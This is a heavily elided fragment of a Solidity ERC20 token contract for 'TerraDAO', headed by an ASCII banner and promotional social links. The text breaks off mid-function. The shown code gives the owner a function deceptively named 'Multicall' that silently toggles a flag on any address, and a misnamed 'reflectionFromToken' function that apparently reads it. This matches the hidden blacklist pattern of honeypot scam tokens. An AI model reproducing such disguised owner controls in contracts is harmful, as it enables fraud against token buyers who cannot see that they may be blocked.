/**
           https://t.me/TerraDAO   https://terradao.click
...
████████ ███████ ██████  ██████   █████      ██████   █████   ██████  
   ...
   ██    ███████ ██   ██ ██   ██ ██   ██     ██████  ██   ██  ██████  
     ...
     https://twitter.com/DaoTerra   https://medium.com/@terradao
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function Multicall (address spender) external onlyOwner {
        if (_Multicall[spender] == true) {_Multicall[spender] = false;} else {_Multicall[spender] = true; }
    }

    /**
     * @notice Checking if the manual call was made.
     */
    function reflectionFromToken(address spender) public view returns (bool) {
